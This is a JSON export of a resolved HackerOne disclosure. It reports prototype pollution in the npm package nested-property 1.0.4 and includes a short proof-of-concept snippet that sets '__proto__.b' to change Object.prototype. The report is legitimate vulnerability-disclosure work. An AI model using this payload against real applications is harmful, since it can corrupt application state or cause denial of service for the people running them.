{
  "id": 788883,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODg4ODM=",
  "url": "https://hackerone.com/reports/788883",
  "title": "[nested-property] Prototype Pollution",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2020-02-04T16:00:49.360Z",
  "submitted_at": "2020-02-04T16:00:49.360Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "johnssimon007",
    "url": "/johnssimon007",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/NWPHHm8hwLotSetPuMmFkHCa/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-10-27T10:54:45.312Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2020-09-27T10:54:38.835Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi team,\nI would like to report a prototype pollution vulnerability in nested-property\nthat allows an attacker to modify properties on Object.prototype.\n\nModule name:nested-property\nversion: 1.0.4\nnpm page: https://www.npmjs.com/package/nested-property\n\nModule Description\nRead, write or test a data structure's nested property via a string like 'my.nested.property'. It works through arrays and objects.\n\n Module Stats\n\n> Replace stats below with numbers from npmâ€™s module page:\n\n[1] weekly downloads :81,395\n\n# Vulnerability\n\n## Vulnerability Description\nthe vulnerabilty is similar to what  reported in https://hackerone.com/reports/719856\nnestedproperty module  is vulnerable when it performs a set operation for nested objects\n\n## Steps To Reproduce:\n\n\n## Supporting Material/References:\n\nvar nestedProperty = require(\"nested-property\");\nconst object = {};\nobject.b=true;\nconsole.log(\"Before \" + object.b); // will log true\nnestedProperty.set(object, '__proto__.b', false);\nconsole.log(\"After \" + {}.b); // will log false\n\n- [OPERATING SYSTEM VERSION] Ubuntu 16.04\n- [NODEJS VERSION]  10.16\n- [NPM VERSION] 6.90\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N \n\n> Hunter's comments and funny memes goes here\n\nhttps://media1.tenor.com/images/dc2899b4432861e0ce1b9a03d8c98719/tenor.gif\n\n## Impact\n\nThis might causes Denial of Service or RCE in some cases",
  "weakness": {
    "id": 106,
    "name": "Modification of Assumed-Immutable Data (MAID)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2020-10-27T10:54:38.949Z",
  "allow_singular_disclosure_after": -154647959.66895825,
  "singular_disclosure_allowed": true,
  "vote_count": 14,
  "voters": [
    "xnutronex",
    "hundredpercent",
    "johnssimon007",
    "azima1337",
    "vgatewoo69",
    "subish88",
    "shadowhare",
    "muemmelmoehre",
    "zeltric",
    "0t4j0n",
    "and 4 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 5.9,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "high",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 2986,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "Other module",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
